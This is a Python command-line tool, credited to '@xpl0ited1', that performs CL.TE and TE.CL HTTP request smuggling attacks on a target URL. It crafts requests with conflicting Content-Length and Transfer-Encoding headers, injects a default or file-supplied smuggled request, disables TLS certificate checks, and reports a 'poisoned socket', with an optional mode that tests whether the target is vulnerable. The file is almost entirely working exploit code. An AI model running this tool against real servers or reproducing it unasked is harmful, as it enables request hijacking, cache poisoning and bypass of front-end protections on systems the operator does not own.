import contextlib
import warnings

from requests import Request, Session
from colorama import Fore, Style, Back
import argparse, requests
import requests
from urllib3.exceptions import InsecureRequestWarning

old_merge_environment_settings = requests.Session.merge_environment_settings


@contextlib.contextmanager
def no_ssl_verification():
    opened_adapters = set()

    def merge_environment_settings(self, url, proxies, stream, verify, cert):
        # Verification happens only once per connection so we need to close
        # all the opened adapters once we're done. Otherwise, the effects of
        # verify=False persist beyond the end of this context manager.
        opened_adapters.add(self.get_adapter(url))

        settings = old_merge_environment_settings(self, url, proxies, stream, verify, cert)
        settings['verify'] = False

        return settings

    requests.Session.merge_environment_settings = merge_environment_settings

    try:
        with warnings.catch_warnings():
            warnings.simplefilter('ignore', InsecureRequestWarning)
            yield
    finally:
        requests.Session.merge_environment_settings = old_merge_environment_settings

        for adapter in opened_adapters:
            try:
                adapter.close()
            except:
                pass


parser = argparse.ArgumentParser()
parser.add_argument("-v", "--verbose", help="Verbose, show sent requests", action='store_true')
parser.add_argument("-p", "--payload", help="Payload File, specify payload file path")
parser.add_argument("-tc", "--tecl", help="TE.CL Attack", action='store_true')
parser.add_argument("-t", "--test", help="Test if vulnerable", action='store_true')
parser.add_argument("-ct", "--clte", help="CL.TE Attack (default)", action='store_true')
parser.add_argument("-u", "--url", help="Target URL", required=True)
args = parser.parse_args()


FINAL_LINES = "\r\n\r\n"
DEFAULT_PAYLOAD = "GET /idontexisst HTTP / 1.1"

IS_VERBOSE = args.verbose
PAYLOAD_PATH = args.payload if args.payload else None
IS_TE_CL = args.tecl
IS_CL_TE = False if args.tecl else True
URL = args.url
IS_TEST = args.test


def print_banner():
    banner = f"{Fore.GREEN}                                                  ###            \n" \
             "    ####          ##   ## ###  ##  ######  ###### ###    ########\n" \
             "   ###            ### ### ###  ## ###     ###     ###            \n" \
             "   ###    ####### ####### ###  ## ###  ## ###  ## ###     #######\n" \
             "   ###            ## # ## ###  ## ###  ## ###  ## ###     ###    \n" \
             "#####             ##   ##  #####   ######  ###### ####### #######\n" \
             "                  ##                                             \n" \
             "                  ##                                             \n" \
             "                                        by @xpl0ited1            \n\n"
    print(banner)


def get_payload_file(path):
    with open(path, "r") as file:
        return str(file.read())


def get_payload():
    if PAYLOAD_PATH:
        return get_payload_file(PAYLOAD_PATH)
    else:
        return DEFAULT_PAYLOAD


def print_request_cl_te(req, prefix, payload):
    print(f"{Fore.RED}" + u"\u25A9\u25A9\u25A9\u25A9\u25A9\u25A9\u25A9\u25A9\u25A9" + " Frontend")
    print(
        f"{Fore.RED}{Back.WHITE}" + u"\u25A9\u25A9\u25A9\u25A9\u25A9\u25A9\u25A9\u25A9\u25A9" + f" Backend{Style.RESET_ALL}")
    print(f"{Fore.WHITE}-" * 15)
    head = f'{Fore.RED}' + '{}\r\n{}\r\n\r\n'.format(
        req.method + ' ' + req.url,
        '\r\n'.join('{}: {}'.format(k, v) for k, v in req.headers.items()), )
    p = f'{Fore.RED}''{}\r\n\r\n'.format(prefix[:1])
    body = f'{Back.WHITE}' + '{}'.format(payload) + f"{Style.RESET_ALL}"
    print(head + p + body)
    print(f"{Fore.WHITE}-" * 15 + f"{Style.RESET_ALL}")


def print_request_te_cl(req, prefix, payload):
    print(f"{Fore.RED}" + u"\u25A9\u25A9\u25A9\u25A9\u25A9\u25A9\u25A9\u25A9\u25A9" + " Frontend")
    print(
        f"{Fore.RED}{Back.WHITE}" + u"\u25A9\u25A9\u25A9\u25A9\u25A9\u25A9\u25A9\u25A9\u25A9" + f" Backend{Style.RESET_ALL}")
    print(f"{Fore.WHITE}-" * 15)
    head = f'{Fore.RED}' + '{}\r\n{}\r\n\r\n'.format(
        req.method + ' ' + req.url,
        '\r\n'.join('{}: {}'.format(k, v) for k, v in req.headers.items()), )
    p = f'{Fore.RED}''{}'.format(prefix)
    body = f'{Back.WHITE}' + '{}'.format(payload[:-6])
    print(head + p + body + f"{Style.RESET_ALL}{Fore.RED}\r\n0\r\n\r\n")
    print(f"{Fore.WHITE}-" * 15 + f"{Style.RESET_ALL}")


def cl_te_attack(smuggling):
    s = Session()
    prefix = "0\r\n\r\n"
    payload = prefix + smuggling
    headers = {"Connection": "close", "Content-Type": "application/x-www-form-urlencoded",
               "Transfer-Encoding": "chunked"}

    req = Request('POST', URL, data=payload + FINAL_LINES, headers=headers)
    prepped = req.prepare()
    # do something with prepped.headers
    prepped.headers['Content-Length'] = len(payload)
    if IS_VERBOSE:
        print_request_cl_te(prepped, prefix, smuggling)
    with no_ssl_verification():
        s.send(prepped, verify=False, timeout=5)
    print("[+]Poisoned socket")
    if IS_TEST:
        with no_ssl_verification():
            r = requests.get(URL, allow_redirects = False)
        print("[+] Results: ")
        print(r.text, "code:", r.status_code)
    else:
        print("[+] Good luck!")


def te_cl_attack(smuggling):
    s = Session()
    smug = smuggling + "0"
    prefix = f'{len(smug):02x}'
    prefix = prefix + "\r\n"
    payload = prefix + smug + FINAL_LINES
    headers = {"Connection": "close", "Content-Type": "application/x-www-form-urlencoded",
               "Transfer-Encoding": "chunked"}

    req = Request('POST', URL, data=payload, headers=headers)
    prepped = req.prepare()
    # do something with prepped.headers
    prepped.headers['Content-Length'] = len(prefix)
    if IS_VERBOSE:
        print_request_te_cl(prepped, prefix, smug + FINAL_LINES)
    with no_ssl_verification():
        s.send(prepped, verify=False, timeout=5)
    print("[+]Poisoned socket")
    if IS_TEST:
        with no_ssl_verification():
            r = requests.get(URL, allow_redirects = False)
        print("[+] Results: ")
        print(r.text, "code:", r.status_code)
    else:
        print("[+] Good luck!")


print_banner()
payload = get_payload()
if IS_CL_TE:
    print(f"{Fore.WHITE}[+] CL.TE HTTP Request Smuggling Attack")
    cl_te_attack(payload)
else:
    print(f"{Fore.WHITE}[+] TE.CL HTTP Request Smuggling Attack")
    te_cl_attack(payload)
